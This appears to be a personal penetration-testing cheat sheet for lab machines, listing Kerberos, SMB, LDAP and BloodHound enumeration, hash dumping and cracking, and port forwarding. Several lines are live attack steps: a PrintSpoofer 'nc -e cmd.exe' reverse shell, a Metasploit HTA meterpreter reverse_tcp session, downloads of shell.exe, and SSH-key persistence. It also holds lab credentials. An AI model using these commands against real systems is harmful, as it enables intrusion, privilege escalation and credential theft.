
#commands #linux #basics #cheetsheet

----------------------------------------------------Ftp
```
ftp ip
SITE CPFR   copy from
SITE CPTP   copy to
```

-----------------------------------port 88 Kerberos

```
kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local user_name.txt
```

```
GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.192 -format john
```


```
secretsdump.py 'cascade.local/s.smith:sT333ve2'@10.10.10.182
```


---------------------------- PowerUpSQL



----------------------------alias
```
echo "alias odat='/home/antivenom/tools/odat/odat.py'" >> ~/.zshrc
```





-------------------------file transfer

![[Pasted image 20250912221259.png]]

```powershell
Invoke-WebRequest -Uri http://ip/file -OutFile C:\Path\FIlename
```



down below creats an smbserver
```
sudo smbserver.py LOOT .
```
Powershell command to transfer to the smb
```
Copy-Item -Path .\20250912022846_loot.zip -Destination \\YOUR_IP\LOOT\
```


```
GetNPUsers.py -dc-ip 10.10.10.175 -no-pass -usersfile users2.txt -request 'EGOTISTICAL-BANK.local/' -format hashcat
```

----------------------------rpc

```
rpcclient -U "" -N 10.10.10.172
```


-----------------------------pfx
```

```

----------------------------------------------------ssh


```
ssh -L 5801:localhost:5801 -L 5901:localhost:5901 user@ip


ssh -L 5000:127.0.0.1:5000 ilya@backfire.htb



echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDES/xWh2nVlXzp+39B5YTqUBehHGoEwehvtLlNdogEooFwhJHaJYmEWQ4pzbX23UWUCCTeLOPmeeD0fViMNssRACdMvXylCXEAG/YadgILvNj7Q2FGMBm6F39A5H6/pINO0EfdDPfvW5bMxsIaOyn6sXAyzNx1ogXDGPFrhSTlWXohPfWtA8QuPsVEuWS9x/PBnJerYxGv1fiXtTAc0/fmNBI9n5bszWKwBSXWWJ6S1w/cxCTQS+6QRBIE7kFy+vt0pdrJ7zvoBwMOcciB82A6qR+wAUbZfn5dDsTQjtbst69hclL4b6cfNIeNF+/VRgPM8qSZ0sZftkaXHq32/RukZH+6MXXQIdYu2qgVBRxee2uEcuvuegGEtiNPIjbkqz5P6w2zei2RbjBoVRRPgZ/+YMZXVxYCjUmjwliFcth66FIEr2tCo9CeeW+qN5x4dOwarUEZBdXX/QOv4+b4abZmtiTEa3zy1m2SAT9z4+SJWDHCj43f7L4vzlatSHCGAlmXjVlGICvomEyR+ErGvAkDVuqD4UaRQ1ufz/4IxVAOSe+97Eo2Tw0myMJNaFXJDfSnYcQf1rR85dHHJ6gGc5JYp2ng7+YANz3SkHKVOtNxWWYvyyHZAMMVzly8XpIEQc1uDq1+ArUtjF9nuAaRQ2eo7M+LNA2U//XsRI2nPQpDeQ== your_email@example.com' | tee -a ~/.ssh/authorized_keys

```

-----------------------------------------------------ferox

 ```
feroxbuster -u https://10.10.10.250/manager/status/ --insecure
```


------------------------------------------------------privex Linux

```
find / -name backup* 2>/dev/null
```      

------------------------------------------------------netcat

```
nc <receiver_ip> <port> < file_to_send 

nc -l -p <port> > received_file
```

    
----------------------------------------------------ln(link used tot link files ot folders)

 ```
 ln -s /path/to/folder /destination/folder/location
```

    
-----------------------------------------------stable shell linux

 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
	export SHELL=bash  
stty raw -echo; fg
stty -a
stty rows 22 columns 90
```
      
-----------------------------------------------------find

 ```
 find . -writable  
```

-----------------------------------------------------smb(139,445)

```
smbclient -L //ip
smbclient //ip/Public
nxc smb ip -u 'somehting' -p 'something' --shares
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse machine-ip
smbget -R smb://machine-ip/anonymous

nxc smb administrator.htb -u "Olivia" -p "ichliebedich" --users

above command can give more information about the users and sometimes their passwords

nxc smb administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute

above commad for user enum
```

![[Pasted image 20250912215323.png]]

```
netexec smb 10.10.10.192 -u 'somethinng' -p 'somethign' --users 

```


----------------------------------------------------nfs

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount machine-ip
```

---------------------------------------------------hydra


-------------------------------------mount
```
sudo mount -t cifs -o 'username=audit2020,password=admin@123' //10.10.10.192/forensic /mnt
```

```

mount ip:/filetomount filewheretomount
mount ip:/var mnt

```


----------------------------------Port forwarding

```
ss -tulpn
netstat -plant
ssh -L 10000:localhost:10000 <username>@<ip>
ssh -L 9000:imgur.com:80 user@example.com
/chisel server --reverse --port 9001
./chisel client 10.17.66.176:9001 R:3333:127.0.0.1:6666 

```


------------------------------mysql

```
mysql -h 127.0.0.1 -P 3306 -u <username> -p
mysql -h 127.0.0.1 -P 3333 -u agent47 -p --ssl=0

```

-------------------------crytography

```
john crack.hash --wordlist=rockyou --format=MD-SHA256
hashcat -m -a0 -w rockyou hash.txt


```


----------------------------------port 3389 (RDP)

```
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>

xfreerdp /v:<server_ip_or_hostname> /u:<username> /p:<password>

```

---------------------------hta
```
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```



---------------------------potato
```

printspoffer.exe -c "c:\user\desktop\nc.exe -e cmd.exe ip port"
```


-------------------------------windows
```
certutil -f -urlcache <url> <filename>

Invoke-WebRequest -Uri "http://10.13.74.171:9999/shell.exe" -OutFile "C:\Users\Bob\Desktop\shell.exe"

```


--------------------------------storage
```
df --total -h | grep total

```

---------------------------mobsf

```
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Default username and password: mobsf/mobsf
```


--------------------------bloodhound

```
bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42

	
```

```
bloodhound-python -u 'support' -p '#00^BlackKnight' -d 'blackfield.local' -ns 10.10.10.192 -c all -dc blackfield.local --disable-autogc
```


--------------------------------rpcclient


```
rpcclient -U 'CICADA.htb/' 10.10.11.35
```


--------------------------winrm


```
nxc winrm ip -u '' -p '' 
evi;winrm 
```


----------------------------Ldap(389)

```
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf



```

```
ldapsearch -H ldap://<TARGET_IP> -D '<USERNAME>' -w '<PASSWORD>' -b 'DC=<DOMAIN>,DC=<TLD>'
```
